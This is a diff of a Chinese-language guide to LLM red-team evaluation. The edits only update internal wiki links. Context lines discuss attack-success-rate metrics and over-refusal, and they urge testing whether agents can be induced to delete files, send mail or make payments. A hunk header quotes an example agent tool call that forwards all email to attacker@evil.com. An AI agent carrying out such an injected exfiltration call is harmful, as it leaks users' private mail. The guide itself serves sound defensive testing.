@@ -239,7 +239,7 @@ Agent: [调用 email.forward_all(recipient="attacker@evil.com")]
 
 红队应重点测试：**Agent 是否会在被诱导时执行破坏性操作？**（如删除文件、发送邮件、执行支付）。
 
-> **深入阅读**: Agent 安全的完整测试方法见 [[../17_伦理安全/04_AI_Safety_RedTeaming/AI_Red_Teaming_Guide|AI 红队测试完全指南]] 和 [[../LLM_Evaluation/Agent_Evaluation_Framework|Agent 评估框架]]。
+> **深入阅读**: Agent 安全的完整测试方法见 [[../17_伦理安全/04_AI_Safety_RedTeaming/AI_Red_Teaming_Guide|AI 红队测试完全指南]] 和 [[../03_LLM_Evaluation/Agent_Evaluation_Framework|Agent 评估框架]]。
 
 ---
 
@@ -830,7 +830,7 @@ $$\text{ASR} = \frac{\text{成功绕过安全限制的攻击次数}}{\text{总�
 | 5% ≤ ASR < 15% | 风险 | 需要安全迭代 |
 | ASR ≥ 15% | 危险 | 阻断发布，紧急修复 |
 
-> **注意**: ASR 的"成功"定义需要预先明确。是用人工判断？LLM-as-Judge？关键词匹配？不同判定方法会导致 ASR 差异很大。详见 [[../Evaluation_Tools/LLM_as_Judge_Deep_Dive|LLM-as-Judge 深度解析]]。
+> **注意**: ASR 的"成功"定义需要预先明确。是用人工判断？LLM-as-Judge？关键词匹配？不同判定方法会导致 ASR 差异很大。详见 [[../04_Evaluation_Tools/LLM_as_Judge_Deep_Dive|LLM-as-Judge 深度解析]]。
 
 #### 7.1.2 拒绝率 (Refusal Rate, RR)
 
@@ -1331,7 +1331,7 @@ graph LR
 **真相**: 单看 ASR 会忽略三个问题：
 1. **FRR 是否上升？** 过度拒绝会摧毁用户体验
 2. **攻击覆盖是否完整？** 未测的攻击类型不等于不存在
-3. **评估器是否准确？** LLM-as-Judge 本身有偏差，详见 [[../Evaluation_Tools/LLM_as_Judge_Deep_Dive|LLM-as-Judge 深度解析]]
+3. **评估器是否准确？** LLM-as-Judge 本身有偏差，详见 [[../04_Evaluation_Tools/LLM_as_Judge_Deep_Dive|LLM-as-Judge 深度解析]]
 
 ### 12.3 误区三："红队评估是一次性项目"
 
@@ -1433,10 +1433,10 @@ graph LR
 - [[../17_伦理安全/04_AI_Safety_RedTeaming/AI_Safety_RedTeaming|AI 安全与红队]] — 防御与加固视角（与本篇互补）
 - [[../17_伦理安全/04_AI_Safety_RedTeaming/AI_Red_Teaming_Guide|AI 红队测试完全指南]] — 防御视角的攻击向量速查
 - [[../17_伦理安全/02_Value_Alignment/Value_Alignment|价值对齐]] — RLHF / DPO 安全对齐方法
-- [[../Evaluation_Fundamentals/Model_Evaluation|模型评估]] — 模型评估总论（指标体系基础）
-- [[../Evaluation_Tools/LLM_as_Judge_Deep_Dive|LLM-as-Judge 深度解析]] — 红队评估的自动判定方法
-- [[../Benchmarks/LLM_Benchmark_Suite_2026|LLM Benchmark Suite 2026]] — 安全相关基准（TruthfulQA、HarmBench）
-- [[../LLM_Evaluation/Agent_Evaluation_Framework|Agent 评估框架]] — Agent 安全测试（过度授权风险）
+- [[../01_Evaluation_Fundamentals/Model_Evaluation|模型评估]] — 模型评估总论（指标体系基础）
+- [[../04_Evaluation_Tools/LLM_as_Judge_Deep_Dive|LLM-as-Judge 深度解析]] — 红队评估的自动判定方法
+- [[../02_Benchmarks/LLM_Benchmark_Suite_2026|LLM Benchmark Suite 2026]] — 安全相关基准（TruthfulQA、HarmBench）
+- [[../03_LLM_Evaluation/Agent_Evaluation_Framework|Agent 评估框架]] — Agent 安全测试（过度授权风险）
 - [[../Fairness_Evaluation_for_dummy|公平性评估]] — 偏见与公平性测试方法
 - [[../../治理/safety-evaluation-red-teaming|安全评测 × 红队]] — 治理视角的评估与攻击迭代
 - [[../README|模型评估总览]] — 模型评估章节导航
